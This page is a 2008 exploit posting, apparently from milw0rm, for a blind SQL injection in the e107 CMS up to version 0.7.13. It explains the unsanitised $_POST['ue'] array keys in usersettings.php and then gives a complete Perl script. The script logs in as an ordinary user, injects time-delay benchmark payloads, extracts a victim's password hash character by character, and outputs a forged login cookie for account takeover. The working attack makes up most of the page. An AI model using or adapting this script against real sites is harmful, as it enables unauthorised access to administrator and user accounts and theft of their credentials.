<html><head><title>e107 <= 0.7.13 (usersettings.php) Blind SQL Injection Exploit</title></head><pre># Author:    __GiReX__	
# Homepage:  http://girex.altervista.org
# Date:      19/10/2008

# CMS:       e107
# URL:       http://e107.org/

# Note:	     Works regardless of php.ini settings (magic_quotes, register_globals..)

# Attenction: This exploit was written for educational purpose. 
# Use it at your own risk. Author will be not responsible for any damage.


# Description: e107 is a content management system written in PHP 
# and using the popular open source MySQL database system for content storage. 
# It's completely free, totally customisable and in constant development.


# Bug description:
# e107 presents a vuln in userssettings.php (line 363-395), a POST array ($_POST['ue'])
# goes into an update query, it cleans the values of this array but not the keys name...

# File: usersettings.php (line 363-395)
	if($_POST['ue'])
        ...
		foreach($_POST['ue'] as $key =&gt; $val)
			$err = $ue-&gt;user_extended_validate_entry($val,$extList[$key]);
			if(!$err)
			  $val = $tp-&gt;toDB($val);						   &lt;== Cleans values
			  $ue_fields .= $key.&quot;='&quot;.$val.&quot;'&quot;;                &lt;== Here our $_POST['ue'] keys and values
		}
    }
	...
# Lines: 496-500	

	if($ue_fields)
	{
        // ***** Next line creates a record which presumably should be there anyway, so could generate an error
		$sql-&gt;db_Select_gen(&quot;INSERT INTO #user_extended (user_extended_id, user_hidden_fields) values ('&quot;.intval($inp).&quot;', '')&quot;);
		$sql-&gt;db_Update(&quot;user_extended&quot;, $ue_fields.&quot; WHERE user_extended_id = '&quot;.intval($inp).&quot;'&quot;);  &lt;== Here vulnearable query
	}

# As you can see the return value of the update query isn't checked so we have to use a blind benchmark() method



#!/usr/bin/perl 
# e107 &lt;= 0.7.13 Blind SQL Injection Exploit
# Admin/User's Password Retrieve Exploit
# Works regardless of php.ini settings
# Coded by __GiReX__

use POSIX;
use LWP::UserAgent;
use HTTP::Cookies;
use Digest::MD5  qw(md5 md5_hex md5_base64); 

if(@ARGV &lt; 4)
{
    banner();
    print &quot;[+] You need an user account to run this exploit\n\n&quot;;
    print &quot;[+] Usage: perl $0 &lt;host&gt; &lt;path&gt; &lt;your_username&gt; &lt;your_pass&gt; &lt;victim_id&gt;\n&quot;;
    print &quot;[+] Example: perl $0 localhost /e107/ test password 1\n&quot;;
    exit;
}

my $target  =  ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0].$ARGV[1]:  'http://' . $ARGV[0].$ARGV[1];
my ($user, $pass, $id) = ($ARGV[2], $ARGV[3], ($ARGV[4]) ? $ARGV[4] : 1);

my $lwp =  new LWP::UserAgent or die;
my $cookie_jar = new HTTP::Cookies or die;
$lwp-&gt;cookie_jar( $cookie_jar );

my @cset  =  (48..57, 97..102); 

my $benchmark = 1000000;
my $prefix = &quot;e107&quot;;     
my $hash = &quot;&quot;;

banner();
try_login($user, $pass) or die &quot;[-] Unable to login with $user and $pass\n&quot;;

syswrite(STDOUT,      &quot;[+] Logged in with your account..\n&quot;.
                      &quot;[+] Checking database delay, please wait..\n\n&quot; );

$ndelay = check_bench(&quot;1=0&quot;);
print STDOUT &quot;[+] Normal delay: $ndelay\n&quot;;

$bdelay = check_bench(&quot;1=1&quot;);
print STDOUT &quot;[+] Benchmark delay: $bdelay\n\n&quot;; 

if($bdelay - $ndelay &lt; 4)
{
    print STDOUT &quot;[-] Benchmarck delay too small compared to normal delay, increase it.\n&quot;;
    exit ();
}

    
for(my $j = 1; $j &lt;= 32; $j++)
{  
    foreach $char(@cset)
    {    
        info(chr($char), $hash, &quot;password&quot;);
        
        my ($pre_time, $post_time) = time();
        $rv = check_char($char, $j, &quot;user_password&quot;);    
        $post_time = time();
    
             if($rv and ($post_time - $pre_time) &gt; ($ndelay + 3))
             {        
                 $hash .= chr($char);
                 last;
             }
    }
    
    last if $j != length($hash);
}    

if(not defined $hash or length($hash) != 32)
{
    print STDOUT &quot;\n\n[-] Exploit mistake: please re-check benchmark\n&quot;;
    exit;
}
else
{
    print STDOUT &quot;\n\n[+] You can try to login with this cookie:\n&quot;;
    print STDOUT &quot;[+] Cookie: ${cookie_prefix}cookie=${id}.&quot;. md5_hex($hash).&quot;\n&quot;;
}

sub try_login
{
   my ($user, $pass) = @_;   
     
     my $res = $lwp-&gt;post( $target.'news.php' , 
                                
                                [ 'username'  =&gt;  $user,
                                  'userpass'  =&gt;  $pass,
                                  'userlogin' =&gt;  'Login',
                                  'autologin' =&gt;  '1' ] );
                                  
     if($res-&gt;status_line =~ /^302|200|301/ or $res-&gt;is_success)
      {
          if($res-&gt;as_string =~ /Set-Cookie: (.+)cookie/)
          {
                $cookie_prefix = $1;
                return 1;
          }
          
          return undef;
      }
    
  die (&quot;[-] Unable to request ${target}news.php &quot;.$res-&gt;status_line.&quot;\n&quot;);
 }

sub info
{
  my($c, $cur, $str)  =  @_;
    
    $cur = '' unless defined $cur;
    print  STDOUT &quot;[+] Victim ${str}: ${cur}${c}\r&quot;;
    
  $| = 1; 
}

sub check_bench
{
  my $true = shift;
  my $delay = 0;

    my $sql = &quot;user_hidden_fields=99 AND CASE WHEN(${true}) THEN benchmark(${benchmark}, MD5(1)) END#&quot;;
       
    for(1..3)
    {
        my ($pre_time, $post_time) = time();  
    
        my $res = $lwp-&gt;post( $target.'usersettings.php',
                                [ 'email'  =&gt;  'damn@email.com',
                                  'updatesettings' =&gt; 'Save Settings',
                                  &quot;ue[${sql}]&quot; =&gt; 'damn' ]);        
        $post_time = time();        
        
        $delay += int($post_time - $pre_time);
		}
        
  return ceil($delay / 3);
}

sub check_char
{
  my ($char, $n, $field)  =  @_ ;
  $rand = int($char + $n);
  
  my $sql = &quot;user_hidden_fields=${rand} AND CASE WHEN(SELECT ASCII(SUBSTRING(${field},${n},1)) &quot;.
            &quot;FROM ${prefix}_user WHERE user_id=${id})=${char} THEN benchmark(${benchmark}, MD5(1)) END#&quot;;
       
    my $res = $lwp-&gt;post( $target.'usersettings.php',
                                [ 'email'  =&gt;  'damn@email.com',
                                  'updatesettings' =&gt; 'Save Settings',
                                  &quot;ue[${sql}]&quot; =&gt; 'damn' ]);                    
        
  return $res-&gt;is_success;
}

sub banner
{
    print &quot;\n&quot;;
    print &quot;[+] e107 &lt;= 0.7.13 Blind SQL Injection\n&quot;;
    print &quot;[+] Admin/User's Password Retrieve Exploit\n&quot;;
    print &quot;[+] Coded by __GiReX__\n&quot;;
    print &quot;\n&quot;;
}

# milw0rm.com [2008-10-19]</pre></html>